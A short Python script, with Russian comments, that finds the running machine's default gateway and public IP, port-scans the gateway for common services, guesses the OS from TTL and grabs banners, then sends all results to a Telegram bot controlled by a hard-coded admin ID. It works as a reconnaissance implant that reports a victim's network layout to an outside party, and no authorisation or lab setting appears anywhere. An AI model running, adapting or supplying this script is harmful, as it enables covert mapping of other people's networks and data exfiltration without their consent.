import socket
import requests
import subprocess
import telebot
import re
from concurrent.futures import ThreadPoolExecutor

TOKEN = "your token"
ADMIN_ID = 1234567890
bot = telebot.TeleBot(TOKEN)

def get_actual_gateway():
    try:
        output = subprocess.check_output("route print -4", shell=True).decode('cp866')
        match = re.search(r"0\.0\.0\.0\s+0\.0\.0\.0\s+([\d.]+)", output)
        if match:
            return match.group(1)
    except Exception:
        pass
    return None


try:
    target_ext = requests.get("https://api.ipify.org", timeout=5).text
except Exception:
    target_ext = "Unknown"

TARGET = get_actual_gateway()

PORTS = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080]
TIMEOUT = 0.7


def get_os_guess(ttl):
    if ttl <= 64: return "Linux/Unix/IoT"
    if ttl <= 128: return "Windows"
    return "Unknown Device"


def probe_port(port):
    if not TARGET: return

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(TIMEOUT)
        res = s.connect_ex((TARGET, port))
        if res == 0:
            try:
                ttl = s.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)
                os_guess = get_os_guess(ttl)
            except Exception:
                os_guess = "Unknown"
                ttl = "?"

            # Адаптивный запрос
            if port in [80, 8080]:
                s.send(b"HEAD / HTTP/1.1\r\nHost: localhost\r\n\r\n")
            elif port == 443:
                s.send(b"\x16\x03\x01\x00\x94\x01\x00\x00\x90\x03\x03")
            else:
                s.send(b"\r\n")

            try:
                banner = s.recv(1024).decode(errors='ignore').strip()
                banner = " ".join(banner.split())[:60]
            except Exception:
                banner = "No response (Silent)"

            bot.send_message(ADMIN_ID, f"Port: `{port}`\nTTL: `{ttl:<3}`\nOS: `{os_guess:12}`\nInfo: `{banner}`",
                             parse_mode="Markdown")


def run():
    if not TARGET:
        bot.send_message(ADMIN_ID, "Ошибка: Не удалось найти основной шлюз сети.")
        return

    bot.send_message(ADMIN_ID, f"IP: `{target_ext}`\nTargeting: `{TARGET}` (Local)", parse_mode="Markdown")

    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(probe_port, PORTS)


if __name__ == "__main__":
    run()